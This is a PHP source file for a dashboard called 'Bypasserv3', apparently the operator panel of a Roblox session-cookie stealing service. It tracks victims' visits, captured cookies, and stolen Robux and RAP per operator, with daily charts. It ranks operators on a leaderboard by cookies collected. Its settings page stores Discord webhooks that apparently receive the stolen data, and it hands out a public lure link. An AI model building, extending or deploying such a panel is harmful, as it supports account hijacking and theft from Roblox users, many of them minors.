<?php
session_start();

if (!isset($_SESSION['token']) || !isset($_SESSION['directory'])) {
    header("Location: sign-in.php");
    exit();
}

require_once '../config.php';
require_once '../functions.php';

$directory = $_SESSION['directory'];
$instanceData = getInstanceData($directory);

if (!$instanceData) {
    session_destroy();
    header("Location: sign-in.php");
    exit();
}

// Extract data
$username = $instanceData['username'] ?: $directory;
$profilePic = $instanceData['profilePicture'];
$webhook = $instanceData['webhook'];
$userWebhook = $instanceData['userWebhook'];
$token = $_SESSION['token'];

$totalVisits = $instanceData['stats']['totalVisits'];
$totalCookies = $instanceData['stats']['totalCookies'];
$totalRobux = $instanceData['stats']['totalRobux'];
$totalRAP = $instanceData['stats']['totalRAP'];
$totalSummary = $instanceData['stats']['totalSummary'];

$dailyVisits = $instanceData['dailyStats']['visits'];
$dailyCookies = $instanceData['dailyStats']['cookies'];
$dailyRobux = $instanceData['dailyStats']['robux'];
$dailyRap = $instanceData['dailyStats']['rap'];
$dailySummary = $instanceData['dailyStats']['summary'];

// Calculate percentage changes (today vs yesterday)
$today = (int)date('w');
$yesterday = ($today - 1 + 7) % 7;

$cookiesToday = $dailyCookies[$today];
$cookiesYesterday = $dailyCookies[$yesterday];
$cookiesChange = $cookiesYesterday != 0 ? round((($cookiesToday - $cookiesYesterday) / $cookiesYesterday) * 100) : ($cookiesToday > 0 ? 100 : 0);

$visitsToday = $dailyVisits[$today];
$visitsYesterday = $dailyVisits[$yesterday];
$visitsChange = $visitsYesterday != 0 ? round((($visitsToday - $visitsYesterday) / $visitsYesterday) * 100) : ($visitsToday > 0 ? 100 : 0);

$robuxToday = $dailyRobux[$today];
$robuxYesterday = $dailyRobux[$yesterday];
$robuxChange = $robuxYesterday != 0 ? round((($robuxToday - $robuxYesterday) / $robuxYesterday) * 100) : ($robuxToday > 0 ? 100 : 0);

$rapToday = $dailyRap[$today];
$rapYesterday = $dailyRap[$yesterday];
$rapChange = $rapYesterday != 0 ? round((($rapToday - $rapYesterday) / $rapYesterday) * 100) : ($rapToday > 0 ? 100 : 0);

$summaryToday = $dailySummary[$today];
$summaryYesterday = $dailySummary[$yesterday];
$summaryChange = $summaryYesterday != 0 ? round((($summaryToday - $summaryYesterday) / $summaryYesterday) * 100) : ($summaryToday > 0 ? 100 : 0);

// Get rank info (using COOKIES not "logs")
$rankInfo = getRankInfo($totalCookies);
$currentRank = $rankInfo['current']['name'];
$currentRankIcon = $rankInfo['current']['icon'];
$nextRank = $rankInfo['next']['name'];
$rankProgress = $rankInfo['progress'];
$cookiesToNext = $rankInfo['cookiesToNext'];

// Get leaderboard
$leaderboard = getLeaderboard(5);

// Handle settings update
$successMessage = '';
$errorMessage = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    if ($_POST['action'] === 'update_settings') {
        $newUsername = trim($_POST['username'] ?? '');
        $newProfilePic = trim($_POST['profilepic'] ?? '');
        $newMasterWebhook = trim($_POST['webhook'] ?? '');
        $newUserWebhook = trim($_POST['userwebhook'] ?? '');
        
        $path = __DIR__ . "/../instances/$directory";
        
        if (!empty($newUsername) && strlen($newUsername) >= 3) {
            file_put_contents("$path/username.txt", $newUsername, LOCK_EX);
            $username = $newUsername;
        }
        
        if (!empty($newProfilePic) && filter_var($newProfilePic, FILTER_VALIDATE_URL)) {
            file_put_contents("$path/profilepic.txt", $newProfilePic, LOCK_EX);
            $profilePic = $newProfilePic;
        }
        
        if (!empty($newMasterWebhook) && filter_var($newMasterWebhook, FILTER_VALIDATE_URL)) {
            file_put_contents("$path/webhook.txt", $newMasterWebhook, LOCK_EX);
            $webhook = $newMasterWebhook;
        }
        
        if (!empty($newUserWebhook) && filter_var($newUserWebhook, FILTER_VALIDATE_URL)) {
            file_put_contents("$path/userwebhook.txt", $newUserWebhook, LOCK_EX);
            $userWebhook = $newUserWebhook;
        }
        
        $successMessage = 'Settings updated successfully!';
    }
}

// Get public URL
$domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$publicUrl = "$protocol://$domain/public/?dir=" . urlencode($directory);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Bypasserv3</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        :root {
            --primary: #8b5cf6;
            --primary-dark: #7c3aed;
            --primary-light: #a78bfa;
            --dark: #0f172a;
            --darker: #0a0e1a;
            --light: #f8fafc;
            --gray: #94a3b8;
            --dark-gray: #1e293b;
            --success: #10b981;
            --error: #ef4444;
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --glass: rgba(30, 41, 59, 0.5);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background-color: var(--darker);
            color: var(--light);
            min-height: 100vh;
            background-image: 
                radial-gradient(at 80% 0%, rgba(139, 92, 246, 0.15) 0px, transparent 50%),
                radial-gradient(at 0% 50%, rgba(139, 92, 246, 0.15) 0px, transparent 50%);
            background-attachment: fixed;
            overflow-x: hidden;
        }

        .container {
            width: 100%;
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .dashboard-container {
            display: grid;
            grid-template-columns: 250px 1fr;
            gap: 20px;
            min-height: 100vh;
        }

        .sidebar {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--glass-border);
            height: fit-content;
            position: sticky;
            top: 20px;
        }

        .sidebar-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 30px;
        }

        .sidebar-header img {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 2px solid var(--primary);
        }

        .sidebar-header h3 {
            font-size: 16px;
            font-weight: 600;
        }

        .sidebar-menu {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .menu-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            border-radius: 12px;
            color: var(--gray);
            transition: var(--transition);
            cursor: pointer;
            border: none;
            background: transparent;
            text-align: left;
            width: 100%;
        }

        .menu-item:hover, .menu-item.active {
            background: rgba(139, 92, 246, 0.2);
            color: var(--light);
        }

        .menu-item i {
            font-size: 18px;
            width: 24px;
            text-align: center;
        }

        .main-content {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: var(--glass);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--glass-border);
        }

        .header h1 {
            font-size: 24px;
            font-weight: 600;
        }

        .user-dropdown {
            position: relative;
        }

        .user-btn {
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
        }

        .user-btn img {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 2px solid var(--primary);
        }

        .dropdown-content {
            background: #1e293b;
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 12px;
            padding: 20px;
            width: 250px;
            position: absolute;
            right: 0;
            top: 60px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
            z-index: 9999;
            display: none;
        }

        .dropdown-content.show {
            display: block;
        }

        .user-info {
            display: flex;
            flex-direction: column;
            gap: 4px;
            margin-bottom: 16px;
        }

        .user-info p {
            font-size: 14px;
            color: var(--gray);
        }

        .user-info p span {
            color: var(--light);
            font-weight: 500;
        }

        .logout-btn {
            width: 100%;
            padding: 10px;
            background: rgba(239, 68, 68, 0.2);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 8px;
            color: var(--error);
            font-weight: 500;
            cursor: pointer;
            transition: var(--transition);
        }

        .logout-btn:hover {
            background: rgba(239, 68, 68, 0.3);
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
        }

        .stat-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--glass-border);
            transition: var(--transition);
        }

        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .stat-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }

        .stat-title {
            font-size: 13px;
            color: var(--gray);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .stat-value {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .stat-change {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 14px;
        }

        .stat-change.positive {
            color: var(--success);
        }

        .stat-change.negative {
            color: var(--error);
        }

        .stat-chart {
            height: 80px;
            margin-top: 16px;
        }

        .stat-daily {
            margin-top: 12px;
            font-size: 13px;
            color: var(--gray);
            text-align: center;
        }

        .stat-daily span {
            color: var(--primary-light);
            font-weight: 600;
        }

        .rank-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--glass-border);
        }

        .rank-header {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .rank-info {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .rank-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .rank-label {
            color: var(--gray);
            font-size: 14px;
        }

        .rank-value {
            font-weight: 600;
            font-size: 15px;
        }

        .progress-container {
            margin-top: 16px;
        }

        .progress-label {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 13px;
            color: var(--gray);
        }

        .progress-bar {
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
            border-radius: 4px;
            transition: width 0.5s ease;
        }

        .leaderboard-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--glass-border);
        }

        .leaderboard-header {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .leaderboard-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .leaderboard-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px;
            border-radius: 12px;
            background: rgba(30, 41, 59, 0.5);
            transition: var(--transition);
        }

        .leaderboard-item:hover {
            background: rgba(139, 92, 246, 0.2);
            transform: translateX(5px);
        }

        .leaderboard-rank {
            font-weight: 700;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--primary);
            border-radius: 50%;
            font-size: 14px;
        }

        .leaderboard-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 2px solid var(--primary);
        }

        .leaderboard-details {
            flex: 1;
        }

        .leaderboard-name {
            font-weight: 600;
            font-size: 14px;
        }

        .leaderboard-stats {
            font-size: 12px;
            color: var(--gray);
        }

        .settings-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid var(--glass-border);
            display: none;
        }

        .settings-header {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: var(--gray);
            font-weight: 500;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(30, 41, 59, 0.5);
            border: 1px solid var(--glass-border);
            border-radius: 8px;
            color: var(--light);
            font-family: 'Poppins', sans-serif;
            transition: var(--transition);
            font-size: 14px;
        }

        .form-input:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
        }

        .submit-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            font-size: 15px;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(139, 92, 246, 0.4);
        }

        .info-box {
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 8px;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 13px;
            color: var(--gray);
        }

        .copy-btn {
            padding: 8px 16px;
            background: rgba(139, 92, 246, 0.2);
            border: 1px solid var(--primary);
            border-radius: 6px;
            color: var(--primary);
            cursor: pointer;
            transition: var(--transition);
            font-size: 13px;
            margin-left: 10px;
        }

        .copy-btn:hover {
            background: rgba(139, 92, 246, 0.3);
        }

        .hidden {
            display: none !important;
        }

        @media (max-width: 1024px) {
            .dashboard-container {
                grid-template-columns: 1fr;
            }
            
            .sidebar {
                position: relative;
                top: 0;
            }
        }

        @media (max-width: 768px) {
            .stats-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="dashboard-container">
            <!-- Sidebar -->
            <div class="sidebar">
                <div class="sidebar-header">
                    <img src="<?php echo htmlspecialchars($profilePic); ?>" alt="Profile">
                    <h3><?php echo htmlspecialchars($username); ?></h3>
                </div>
                <div class="sidebar-menu">
                    <button class="menu-item active" onclick="showDashboard()">
                        <i class="fas fa-tachometer-alt"></i>
                        <span>Dashboard</span>
                    </button>
                    <button class="menu-item" onclick="showSettings()">
                        <i class="fas fa-cog"></i>
                        <span>Settings</span>
                    </button>
                    <button class="menu-item" onclick="window.location.href='logout.php'">
                        <i class="fas fa-sign-out-alt"></i>
                        <span>Logout</span>
                    </button>
                </div>
            </div>

            <!-- Main Content -->
            <div class="main-content">
                <!-- Header -->
                <div class="header">
                    <h1>Dashboard</h1>
                    <div class="user-dropdown">
                        <div class="user-btn" onclick="toggleDropdown()">
                            <img src="<?php echo htmlspecialchars($profilePic); ?>" alt="Profile">
                            <i class="fas fa-chevron-down"></i>
                        </div>
                        <div class="dropdown-content" id="dropdownContent">
                            <div class="user-info">
                                <p><span>Username:</span> <?php echo htmlspecialchars($username); ?></p>
                                <p><span>Rank:</span> <?php echo htmlspecialchars($currentRank); ?> <?php echo $currentRankIcon; ?></p>
                                <p><span>Cookies:</span> <?php echo number_format($totalCookies); ?></p>
                                <p><span>Visits:</span> <?php echo number_format($totalVisits); ?></p>
                            </div>
                            <button class="logout-btn" onclick="window.location.href='logout.php'">
                                <i class="fas fa-sign-out-alt"></i> Logout
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Dashboard Content -->
                <div id="dashboardContent">
                    <!-- Stats Grid -->
                    <div class="stats-grid">
                        <!-- Total Cookies -->
                        <div class="stat-card">
                            <div class="stat-header">
                                <div class="stat-title">Total Cookies</div>
                                <div class="stat-change <?php echo $cookiesChange >= 0 ? 'positive' : 'negative'; ?>">
                                    <i class="fas fa-arrow-<?php echo $cookiesChange >= 0 ? 'up' : 'down'; ?>"></i>
                                    <?php echo abs($cookiesChange); ?>%
                                </div>
                            </div>
                            <div class="stat-value"><?php echo number_format($totalCookies); ?></div>
                            <div class="stat-chart">
                                <canvas id="cookiesChart"></canvas>
                            </div>
                            <div class="stat-daily">+<span><?php echo number_format($cookiesToday); ?></span> cookies today!</div>
                        </div>

                        <!-- Total Visits -->
                        <div class="stat-card">
                            <div class="stat-header">
                                <div class="stat-title">Total Visits</div>
                                <div class="stat-change <?php echo $visitsChange >= 0 ? 'positive' : 'negative'; ?>">
                                    <i class="fas fa-arrow-<?php echo $visitsChange >= 0 ? 'up' : 'down'; ?>"></i>
                                    <?php echo abs($visitsChange); ?>%
                                </div>
                            </div>
                            <div class="stat-value"><?php echo number_format($totalVisits); ?></div>
                            <div class="stat-chart">
                                <canvas id="visitsChart"></canvas>
                            </div>
                            <div class="stat-daily">+<span><?php echo number_format($visitsToday); ?></span> visits today!</div>
                        </div>

                        <!-- Total Robux -->
                        <div class="stat-card">
                            <div class="stat-header">
                                <div class="stat-title">Total Robux</div>
                                <div class="stat-change <?php echo $robuxChange >= 0 ? 'positive' : 'negative'; ?>">
                                    <i class="fas fa-arrow-<?php echo $robuxChange >= 0 ? 'up' : 'down'; ?>"></i>
                                    <?php echo abs($robuxChange); ?>%
                                </div>
                            </div>
                            <div class="stat-value"><?php echo number_format($totalRobux); ?></div>
                            <div class="stat-chart">
                                <canvas id="robuxChart"></canvas>
                            </div>
                            <div class="stat-daily">+<span><?php echo number_format($robuxToday); ?></span> R$ today!</div>
                        </div>

                        <!-- Total RAP -->
                        <div class="stat-card">
                            <div class="stat-header">
                                <div class="stat-title">Total RAP</div>
                                <div class="stat-change <?php echo $rapChange >= 0 ? 'positive' : 'negative'; ?>">
                                    <i class="fas fa-arrow-<?php echo $rapChange >= 0 ? 'up' : 'down'; ?>"></i>
                                    <?php echo abs($rapChange); ?>%
                                </div>
                            </div>
                            <div class="stat-value"><?php echo number_format($totalRAP); ?></div>
                            <div class="stat-chart">
                                <canvas id="rapChart"></canvas>
                            </div>
                            <div class="stat-daily">+<span><?php echo number_format($rapToday); ?></span> RAP today!</div>
                        </div>

                        <!-- Total Summary -->
                        <div class="stat-card">
                            <div class="stat-header">
                                <div class="stat-title">Total Summary</div>
                                <div class="stat-change <?php echo $summaryChange >= 0 ? 'positive' : 'negative'; ?>">
                                    <i class="fas fa-arrow-<?php echo $summaryChange >= 0 ? 'up' : 'down'; ?>"></i>
                                    <?php echo abs($summaryChange); ?>%
                                </div>
                            </div>
                            <div class="stat-value"><?php echo number_format($totalSummary); ?></div>
                            <div class="stat-chart">
                                <canvas id="summaryChart"></canvas>
                            </div>
                            <div class="stat-daily">+<span><?php echo number_format($summaryToday); ?></span> today!</div>
                        </div>
                    </div>

                    <!-- Rank Card -->
                    <div class="rank-card">
                        <div class="rank-header">
                            <span><?php echo $currentRankIcon; ?></span>
                            <span>Rank Progress</span>
                        </div>
                        <div class="rank-info">
                            <div class="rank-item">
                                <span class="rank-label">Current Rank</span>
                                <span class="rank-value"><?php echo htmlspecialchars($currentRank); ?></span>
                            </div>
                            <div class="rank-item">
                                <span class="rank-label">Next Rank</span>
                                <span class="rank-value"><?php echo htmlspecialchars($nextRank); ?></span>
                            </div>
                            <div class="rank-item">
                                <span class="rank-label">Cookies to Next</span>
                                <span class="rank-value"><?php echo number_format($cookiesToNext); ?></span>
                            </div>
                        </div>
                        <div class="progress-container">
                            <div class="progress-label">
                                <span>Progress</span>
                                <span><?php echo $rankProgress; ?>%</span>
                            </div>
                            <div class="progress-bar">
                                <div class="progress-fill" style="width: <?php echo $rankProgress; ?>%"></div>
                            </div>
                        </div>
                    </div>

                    <!-- Leaderboard -->
                    <div class="leaderboard-card">
                        <div class="leaderboard-header">
                            <i class="fas fa-trophy"></i>
                            <span>Top 5 Leaderboard</span>
                        </div>
                        <div class="leaderboard-list">
                            <?php if (empty($leaderboard)): ?>
                                <p style="text-align: center; color: var(--gray); padding: 20px;">No data yet</p>
                            <?php else: ?>
                                <?php foreach ($leaderboard as $index => $user): ?>
                                    <div class="leaderboard-item">
                                        <div class="leaderboard-rank"><?php echo $index + 1; ?></div>
                                        <img src="<?php echo htmlspecialchars($user['profilePicture']); ?>" alt="Avatar" class="leaderboard-avatar">
                                        <div class="leaderboard-details">
                                            <div class="leaderboard-name"><?php echo htmlspecialchars($user['username']); ?></div>
                                            <div class="leaderboard-stats"><?php echo number_format($user['stats']['totalCookies']); ?> cookies • <?php echo number_format($user['stats']['totalVisits']); ?> visits</div>
                                        </div>
                                    </div>
                                <?php endforeach; ?>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>

                <!-- Settings Content -->
                <div class="settings-card" id="settingsCard">
                    <div class="settings-header">Settings</div>
                    
                    <div class="info-box">
                        <strong>Your Public Link:</strong>
                        <code><?php echo htmlspecialchars($publicUrl); ?></code>
                        <button class="copy-btn" onclick="copyToClipboard('<?php echo htmlspecialchars($publicUrl); ?>')">
                            <i class="fas fa-copy"></i> Copy
                        </button>
                    </div>

                    <form method="post">
                        <input type="hidden" name="action" value="update_settings">
                        
                        <div class="form-group">
                            <label class="form-label">Username</label>
                            <input type="text" class="form-input" name="username" value="<?php echo htmlspecialchars($username); ?>" placeholder="Enter username">
                        </div>

                        <div class="form-group">
                            <label class="form-label">Profile Picture URL</label>
                            <input type="url" class="form-input" name="profilepic" value="<?php echo htmlspecialchars($profilePic); ?>" placeholder="https://example.com/avatar.png">
                        </div>

                        <div class="form-group">
                            <label class="form-label">Master Webhook</label>
                            <input type="url" class="form-input" name="webhook" value="<?php echo htmlspecialchars($webhook); ?>" placeholder="https://discord.com/api/webhooks/...">
                        </div>

                        <div class="form-group">
                            <label class="form-label">User Webhook (Optional)</label>
                            <input type="url" class="form-input" name="userwebhook" value="<?php echo htmlspecialchars($userWebhook); ?>" placeholder="https://discord.com/api/webhooks/...">
                        </div>

                        <button type="submit" class="submit-btn">
                            <i class="fas fa-save"></i> Save Changes
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Chart.js configuration
        const chartOptions = {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: {
                    display: false
                },
                tooltip: {
                    backgroundColor: '#1e293b',
                    titleColor: '#a78bfa',
                    bodyColor: '#f8fafc',
                    borderColor: 'rgba(255, 255, 255, 0.1)',
                    borderWidth: 1,
                    padding: 12,
                    displayColors: false
                }
            },
            scales: {
                y: {
                    beginAtZero: true,
                    display: false,
                    grid: {
                        display: false
                    }
                },
                x: {
                    display: false,
                    grid: {
                        display: false
                    }
                }
            },
            elements: {
                point: {
                    radius: 0,
                    hoverRadius: 5
                },
                line: {
                    borderWidth: 2,
                    tension: 0.4
                }
            }
        };

        // Cookies Chart
        new Chart(document.getElementById('cookiesChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyCookies); ?>,
                    borderColor: '#8b5cf6',
                    backgroundColor: 'rgba(139, 92, 246, 0.1)',
                    fill: true
                }]
            },
            options: chartOptions
        });

        // Visits Chart
        new Chart(document.getElementById('visitsChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyVisits); ?>,
                    borderColor: '#ec4899',
                    backgroundColor: 'rgba(236, 72, 153, 0.1)',
                    fill: true
                }]
            },
            options: chartOptions
        });

        // Robux Chart
        new Chart(document.getElementById('robuxChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyRobux); ?>,
                    borderColor: '#10b981',
                    backgroundColor: 'rgba(16, 185, 129, 0.1)',
                    fill: true
                }]
            },
            options: chartOptions
        });

        // RAP Chart
        new Chart(document.getElementById('rapChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyRap); ?>,
                    borderColor: '#3b82f6',
                    backgroundColor: 'rgba(59, 130, 246, 0.1)',
                    fill: true
                }]
            },
            options: chartOptions
        });

        // Summary Chart
        new Chart(document.getElementById('summaryChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailySummary); ?>,
                    borderColor: '#f59e0b',
                    backgroundColor: 'rgba(245, 158, 11, 0.1)',
                    fill: true
                }]
            },
            options: chartOptions
        });

        // Navigation functions
        function showDashboard() {
            document.getElementById('dashboardContent').style.display = 'block';
            document.getElementById('settingsCard').style.display = 'none';
            document.querySelectorAll('.menu-item').forEach(item => item.classList.remove('active'));
            document.querySelectorAll('.menu-item')[0].classList.add('active');
        }

        function showSettings() {
            document.getElementById('dashboardContent').style.display = 'none';
            document.getElementById('settingsCard').style.display = 'block';
            document.querySelectorAll('.menu-item').forEach(item => item.classList.remove('active'));
            document.querySelectorAll('.menu-item')[1].classList.add('active');
        }

        function toggleDropdown() {
            document.getElementById('dropdownContent').classList.toggle('show');
        }

        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                Swal.fire({
                    title: 'Copied!',
                    text: 'Link copied to clipboard',
                    icon: 'success',
                    timer: 2000,
                    showConfirmButton: false,
                    background: '#0f172a',
                    color: '#f8fafc'
                });
            });
        }

        // Close dropdown when clicking outside
        window.onclick = function(event) {
            if (!event.target.matches('.user-btn') && !event.target.matches('.user-btn *')) {
                const dropdown = document.getElementById('dropdownContent');
                if (dropdown.classList.contains('show')) {
                    dropdown.classList.remove('show');
                }
            }
        }

        // Show success/error messages
        <?php if ($successMessage): ?>
            Swal.fire({
                title: 'Success!',
                text: '<?php echo $successMessage; ?>',
                icon: 'success',
                background: '#0f172a',
                color: '#f8fafc',
                confirmButtonColor: '#8b5cf6'
            });
        <?php endif; ?>

        <?php if ($errorMessage): ?>
            Swal.fire({
                title: 'Error',
                text: '<?php echo $errorMessage; ?>',
                icon: 'error',
                background: '#0f172a',
                color: '#f8fafc',
                confirmButtonColor: '#ef4444'
            });
        <?php endif; ?>
    </script>
</body>
</html>
